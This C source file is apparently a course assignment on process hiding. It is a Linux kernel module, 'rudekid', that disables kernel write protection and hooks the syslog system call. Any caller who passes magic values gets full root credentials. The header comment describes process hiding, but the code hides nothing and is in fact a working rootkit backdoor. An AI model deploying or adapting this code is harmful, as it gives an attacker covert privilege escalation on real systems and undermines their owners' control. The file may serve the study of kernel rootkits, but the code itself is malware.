/*
 *  Assignment 3
 *  Process Hiding
 *
 *  Requirements:
 *     a) Hide processes from the user in such a way that they are still scheduled.
 *     b) Tasks to hide should be identified by an array of PIDs passed to the
 *         module on the command line when loading the module
 */

#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/reboot.h>
#include <linux/moduleparam.h>
#include <linux/fs.h>
#include <linux/async.h>
#include <linux/pid_namespace.h>
#include <linux/ptrace.h>

#include <asm/paravirt.h>
#include <asm/cacheflush.h>
#include <asm-generic/uaccess.h>

#include "sysmap.h"
#include "proc_internal.h"

void disable_ro(void)
{
    write_cr0(read_cr0() & ~X86_CR0_WP);
    barrier();
}

void enable_ro(void)
{
    write_cr0(read_cr0() | X86_CR0_WP);
    barrier();
}

typedef struct
{
    enum {
        GibeRoot,
    } cmd;
    union {
        // todo
    } payload;
} CCC;

#define syscalls ((void**)SM_sys_call_table)
int (*asmlinkage old_syslog_func)(int type, char __user* buf, int len);
asmlinkage int fake_syslog(int type, char __user* buf, int len)
{
    struct cred* new;
    kuid_t kuid;

    CCC ccc;
    if ((type == 0xabad1dea) && (len == 1337))
    {
        if (copy_from_user(&ccc, buf, sizeof(ccc)) == 0)
        {
	    switch (ccc.cmd)
	    {
	    case GibeRoot:
		new = prepare_creds();
		new->suid = new->uid = kuid = make_kuid(current_user_ns(), 0);
		free_uid(new->user);
		new->user = alloc_uid(kuid);
		new->fsuid = new->euid = kuid;
		commit_creds(new);
		break;
	    default:
		return -42;
	    }
	    
            return 42;
        }
    }

    return old_syslog_func(type, buf, len);
}

void hook_syslog(void)
{
    disable_ro();
    old_syslog_func = syscalls[__NR_syslog];
    syscalls[__NR_syslog] = fake_syslog;
    enable_ro();
}

void unhook_syslog(void)
{
    disable_ro();
    syscalls[__NR_syslog] = old_syslog_func;
    enable_ro();
}

int init_module(void){
    printk(KERN_INFO "rudekid loaded.\n");
    hook_syslog();

    return 0;
}

void cleanup_module(void){
    printk(KERN_INFO "rudekid unloaded.\n");

    unhook_syslog();
}

